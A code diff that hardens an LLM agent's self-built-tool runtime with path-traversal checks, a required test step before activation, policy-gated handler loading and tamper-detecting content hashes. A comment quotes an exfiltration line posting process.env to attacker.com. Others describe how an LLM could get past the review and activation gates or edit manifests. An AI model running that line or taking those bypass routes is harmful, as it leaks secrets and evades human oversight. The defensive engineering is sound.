@@ -23,6 +23,7 @@
 
 import path from 'path';
 import fs from 'fs/promises';
+import crypto from 'crypto';
 
 import type { LocalToolDefinition } from '../tools/types.js';
 import { registerTool } from '../tools/registry.js';
@@ -42,6 +43,35 @@ import {
 } from './types.js';
 
 const CONSTRUCTED_ROOT_SUBPATH = path.join('.kodax', 'constructed');
+
+/**
+ * Reject artifact identifiers that could escape `.kodax/constructed/<kind>s/`
+ * via path traversal. Catches both the obvious cases (`../../etc/passwd`,
+ * absolute paths, drive letters) and Windows-reserved characters that
+ * would break manifest persistence.
+ *
+ * Restricts to `[A-Za-z0-9._-]` plus a leading semver-friendly char.
+ * Length cap (128) bounds the on-disk path length so a 4 KB filename
+ * can't be smuggled in. Not a security boundary on its own — defense in
+ * depth alongside the policy gate.
+ */
+function assertSafeIdentifier(value: unknown, label: string): asserts value is string {
+  if (typeof value !== 'string' || value.length === 0 || value.length > 128) {
+    throw new ConstructionManifestError(
+      `Invalid ${label}: must be a non-empty string ≤ 128 chars (got ${typeof value === 'string' ? `length=${value.length}` : typeof value}).`,
+    );
+  }
+  if (!/^[A-Za-z0-9][A-Za-z0-9._-]*$/.test(value) || value.includes('..')) {
+    throw new ConstructionManifestError(
+      `Invalid ${label} ${JSON.stringify(value)}: must match [A-Za-z0-9][A-Za-z0-9._-]* with no '..' sequences. Reserved separator/control characters and parent-traversal segments are rejected.`,
+    );
+  }
+}
+
+/** SHA-256 of the artifact's `content` field, hex-encoded. */
+function computeContentHash(content: ConstructionArtifact['content']): string {
+  return crypto.createHash('sha256').update(JSON.stringify(content)).digest('hex');
+}
 
 /**
  * Single source of truth for which artifact kinds the runtime understands.
@@ -94,30 +124,38 @@ export function _resetRuntimeForTesting(): void {
  * Persist a freshly-built artifact to `.kodax/constructed/<kind>s/<name>/<version>.json`
  * with `status: 'staged'`.
  *
- * Version immutability guard: if a manifest with the same name+version
- * already exists with `status === 'active'`, stage() refuses to overwrite.
- * This protects against the silent class of bugs where (a) a staged
- * version is overwritten in place but (b) the handler's `.js` module is
- * already in the ESM cache from the prior activate(), so the LLM keeps
- * calling old code while the user thinks the new code is live. Bumping
- * version is the supported update path; revoking first is the override.
+ * Version immutability: if any manifest at the same name+version already
+ * exists on disk (in any status — staged, active, or revoked), stage()
+ * refuses to overwrite. Bumping the semver is the supported update path.
  *
- * Re-staging a `'staged'` or `'revoked'` artifact at the same version
- * is allowed — those have not been registered (or have been unregistered)
- * so module cache is not yet load-bearing.
+ * Why "any status", not just `'active'`:
+ *   The handler's `.js` module is loaded via `await import(file://…)`
+ *   which the ESM module cache keys by absolute file URL. Re-writing
+ *   `<version>.js` in place leaves the cached module pointing at the
+ *   OLD code; subsequent loadHandler() calls return the cached export.
+ *   Even revoking first does not flush the cache (Node has no public
+ *   ESM cache eviction API). The only safe-by-construction policy is
+ *   "version is immutable on disk — bump semver to update."
+ *
+ * Lifecycle timestamp reset: `testedAt` / `activatedAt` / `revokedAt`
+ * are explicitly cleared on the persisted record, even if the input
+ * artifact carries them. Defends against an LLM-supplied artifact
+ * pre-stamping testedAt to bypass the activate() gate.
  */
 export async function stage(artifact: ConstructionArtifact): Promise<StagedHandle> {
+  assertSafeIdentifier(artifact.name, 'artifact.name');
+  assertSafeIdentifier(artifact.version, 'artifact.version');
+
   const target = manifestPath(artifact);
   try {
     const raw = await fs.readFile(target, 'utf8');
     const existing = JSON.parse(raw) as ConstructionArtifact;
-    if (existing.status === 'active') {
-      throw new ConstructionManifestError(
-        `Cannot stage '${artifact.name}@${artifact.version}': an active version already exists. `
-        + `Bump version (semver) or revoke the active artifact first.`,
-        target,
-      );
-    }
+    throw new ConstructionManifestError(
+      `Cannot stage '${artifact.name}@${artifact.version}': a manifest already exists at this version (status='${existing.status}'). `
+      + `Constructed artifacts are version-immutable — bump the semver to publish a new variant. `
+      + `Re-staging the same version would silently shadow the cached ESM module, even after revoke.`,
+      target,
+    );
   } catch (err) {
     if (err instanceof ConstructionManifestError) throw err;
     if ((err as NodeJS.ErrnoException).code !== 'ENOENT') throw err;
@@ -128,6 +166,10 @@ export async function stage(artifact: ConstructionArtifact): Promise<StagedHandl
     ...artifact,
     status: 'staged',
     createdAt: artifact.createdAt || Date.now(),
+    testedAt: undefined,
+    activatedAt: undefined,
+    revokedAt: undefined,
+    contentHash: undefined,
   };
 
   await persistArtifact(filled);
@@ -135,13 +177,12 @@ export async function stage(artifact: ConstructionArtifact): Promise<StagedHandl
 }
 
 /**
- * Validate a staged artifact. Runs the full Phase 2 check pipeline:
+ * Validate a staged artifact. Runs the static-only check pipeline:
  *
  *   1. Shape sanity (kind, handler.language, capabilities.tools array).
  *   2. AST hard rules (no-eval / no-Function-constructor / require-handler-signature).
  *   3. provider schema validation (Anthropic by default — main path).
- *   4. Handler materialize (writes .js, imports, surfaces syntax errors).
- *   5. LLM static review (only when caller injects `options.llmReviewer`).
+ *   4. LLM static review (only when caller injects `options.llmReviewer`).
  *
  * Verdict dispatch on LLM review:
  *   - 'safe'        → ok=true, no LLM-review warnings.
@@ -151,8 +192,17 @@ export async function stage(artifact: ConstructionArtifact): Promise<StagedHandl
  *   - 'dangerous'   → ok=false, errors carry the LLM concerns; activate
  *                     will not be reachable without a fresh stage().
  *
+ * IMPORTANT — handler is NOT materialized here. The earlier "materialize
+ * handler to surface syntax errors" step performed `await import(file://…)`
+ * BEFORE the policy gate, which executed the handler module's top-level
+ * code as a side effect. AST rules cover `eval` / `Function`, but a
+ * top-level `await fetch('http://attacker.com', { body: process.env })`
+ * was unguarded — see DD §14.5 threat model. loadHandler() now happens
+ * exclusively inside `activate()` after the policy verdict is `'approve'`,
+ * making the policy gate the single chokepoint for code execution.
+ *
  * The LLM reviewer is opt-in: tests and Phase 1 callers that don't pass
- * a client get the deterministic AST + schema + materialize path only.
+ * a client get the deterministic AST + schema path only.
  */
 export interface TestArtifactOptions {
   /** Provider whose tool schema constraints are checked. Defaults to 'anthropic'. */
@@ -211,20 +261,7 @@ export async function test(
     return { ok: false, errors, warnings };
   }
 
-  // 4. Materialize handler — surfaces syntax errors / missing export early.
-  try {
-    await loadHandler(
-      { name: artifact.name, version: artifact.version, cwd: _options.cwd },
-      artifact.content.handler,
-      artifact.content.capabilities,
-      { timeoutMs: artifact.content.timeoutMs },
-    );
-  } catch (err) {
-    errors.push(`Handler materialize failed: ${(err as Error).message}`);
-    return { ok: false, errors, warnings };
-  }
-
-  // 5. LLM static review (opt-in)
+  // 4. LLM static review (opt-in)
   if (options.llmReviewer) {
     let review: LlmReviewResult;
     try {
@@ -255,8 +292,10 @@ export async function test(
     // 'safe' → no further action.
   }
 
-  artifact.testedAt = Date.now();
-  await persistArtifact(artifact);
+  // Persist a NEW artifact with testedAt set (immutable update — never
+  // mutate the input). The persisted record drives the activate() gate.
+  const tested: ConstructionArtifact = { ...artifact, testedAt: Date.now() };
+  await persistArtifact(tested);
   return warnings.length > 0 ? { ok: true, warnings } : { ok: true };
 }
 
@@ -266,9 +305,39 @@ export async function test(
  *
  * Throws `'reject'` policy verdicts as errors. `'ask-user'` requires the
  * caller to have overridden the policy (Phase 1 has no built-in prompt UI).
+ *
+ * Pre-conditions:
+ *   - artifact.testedAt must be set (test() must have run successfully).
+ *     Without this gate the AST/schema/LLM-review chain could be skipped
+ *     entirely by an LLM that calls activate_tool directly after stage_tool.
+ *   - artifact.status must not be 'revoked' (terminal).
+ *
+ * Side-effects:
+ *   - loadHandler() runs `await import(file://…)` AFTER policy approval.
+ *     The handler module's top-level code only executes once policy says
+ *     'approve'. This makes the policy gate the single chokepoint for
+ *     code execution; the handler does not run during test().
+ *   - Records `contentHash = sha256(JSON.stringify(content))` so
+ *     rehydrate at the next boot can detect cross-session manifest
+ *     tampering (see ConstructionArtifact.contentHash for threat model).
  */
 export async function activate(handle: StagedHandle): Promise<void> {
-  const { artifact } = handle;
+  const initial = handle.artifact;
+
+  assertSafeIdentifier(initial.name, 'artifact.name');
+  assertSafeIdentifier(initial.version, 'artifact.version');
+
+  // Filesystem is the source of truth (DD §14.1). Re-read the persisted
+  // record so this function works whether the caller threaded the latest
+  // testedAt / status onto the in-memory handle or not — keeps the
+  // `stage → test → activate` chain composable and matches the
+  // `toolActivateTool` builtin path which also re-reads from disk.
+  const artifact = await readArtifactByVersion(initial.name, initial.version);
+  if (!artifact) {
+    throw new Error(
+      `Cannot activate '${initial.name}@${initial.version}': artifact not found on disk. Stage and test it first.`,
+    );
+  }
 
   // Lifecycle guard: revoked artifacts are terminal — re-activation must
   // go through a fresh stage(name, newVersion). Re-activating an already-
@@ -278,6 +347,12 @@ export async function activate(handle: StagedHandle): Promise<void> {
     throw new Error(
       `Cannot activate '${artifact.name}@${artifact.version}': artifact is revoked. `
       + `Revoked artifacts are terminal; bump the version and re-stage.`,
+    );
+  }
+  if (!artifact.testedAt) {
+    throw new Error(
+      `Cannot activate '${artifact.name}@${artifact.version}': artifact has not passed test(). `
+      + `Call test_tool first — activation must follow the AST/schema/LLM-review chain so the policy gate is not the only line of defense.`,
     );
   }
 
@@ -302,9 +377,15 @@ export async function activate(handle: StagedHandle): Promise<void> {
 
   await registerActiveArtifact(artifact);
 
-  artifact.status = 'active';
-  artifact.activatedAt = Date.now();
-  await persistArtifact(artifact);
+  // Immutable update — persist a NEW artifact record rather than mutating
+  // the caller's reference. Records contentHash for rehydrate integrity.
+  const activated: ConstructionArtifact = {
+    ...artifact,
+    status: 'active',
+    activatedAt: Date.now(),
+    contentHash: computeContentHash(artifact.content),
+  };
+  await persistArtifact(activated);
 }
 
 /**
@@ -356,21 +437,46 @@ async function registerActiveArtifact(artifact: ConstructionArtifact): Promise<v
  * re-run policy gate — startup is restoring previously-approved state,
  * not asking for fresh approval.
  *
- * Returns counts so callers can surface a loaded/failed banner.
- * Failures are logged (console.warn) and the rehydration continues for
- * the remaining artifacts; a single bad manifest must not break boot.
+ * Integrity check: each artifact's `contentHash` (recorded at activate
+ * time) is recomputed and compared to the persisted value. Mismatches
+ * are tampered = skipped with a stderr warning. This catches naive
+ * cross-session edits to the manifest JSON (e.g. an LLM rewriting the
+ * file via the Write tool without recomputing the hash). Sophisticated
+ * attackers who recompute the hash can bypass this — defense scoped to
+ * single-user CLI integrity, not multi-tenant supply chain.
+ *
+ * Legacy artifacts written before contentHash existed are accepted as-is
+ * (no hash to compare against) and the missing hash is back-filled on a
+ * future activate() — keeps upgrades from breaking previously-approved
+ * tools.
+ *
+ * Returns counts so callers can surface a loaded/failed/tampered banner.
+ * Failures are logged (console.warn) and rehydration continues for the
+ * remaining artifacts; a single bad manifest must not break boot.
  */
 export async function rehydrateActiveArtifacts(): Promise<{
   loaded: number;
   failed: number;
+  tampered: number;
 }> {
   const all = await loadAllArtifacts(_options.cwd);
   const active = all.filter((a) => a.status === 'active');
 
   let loaded = 0;
   let failed = 0;
+  let tampered = 0;
 
   for (const artifact of active) {
+    if (artifact.contentHash) {
+      const recomputed = computeContentHash(artifact.content);
+      if (recomputed !== artifact.contentHash) {
+        tampered += 1;
+        console.warn(
+          `[ConstructionRuntime] Refusing to rehydrate ${artifact.name}@${artifact.version}: contentHash mismatch (manifest was edited after activation). Re-stage and re-activate to re-approve.`,
+        );
+        continue;
+      }
+    }
     try {
       await registerActiveArtifact(artifact);
       loaded += 1;
@@ -382,7 +488,7 @@ export async function rehydrateActiveArtifacts(): Promise<{
     }
   }
 
-  return { loaded, failed };
+  return { loaded, failed, tampered };
 }
 
 /**
@@ -394,6 +500,9 @@ export async function rehydrateActiveArtifacts(): Promise<{
  * Idempotent: revoking an unknown name@version is a no-op.
  */
 export async function revoke(name: string, version: string): Promise<void> {
+  assertSafeIdentifier(name, 'name');
+  assertSafeIdentifier(version, 'version');
+
   const key = `${name}@${version}`;
   const unregister = _activated.get(key);
   if (unregister) {
@@ -403,9 +512,13 @@ export async function revoke(name: string, version: string): Promise<void> {
 
   const artifact = await readArtifactByVersion(name, version);
   if (artifact) {
-    artifact.status = 'revoked';
-    artifact.revokedAt = Date.now();
-    await persistArtifact(artifact);
+    // Immutable update — persist a NEW artifact record.
+    const revoked: ConstructionArtifact = {
+      ...artifact,
+      status: 'revoked',
+      revokedAt: Date.now(),
+    };
+    await persistArtifact(revoked);
   }
 }
 
@@ -456,6 +569,8 @@ export async function readArtifact(
   name: string,
   version: string,
 ): Promise<ConstructionArtifact | undefined> {
+  assertSafeIdentifier(name, 'name');
+  assertSafeIdentifier(version, 'version');
   return readArtifactByVersion(name, version);
 }
 
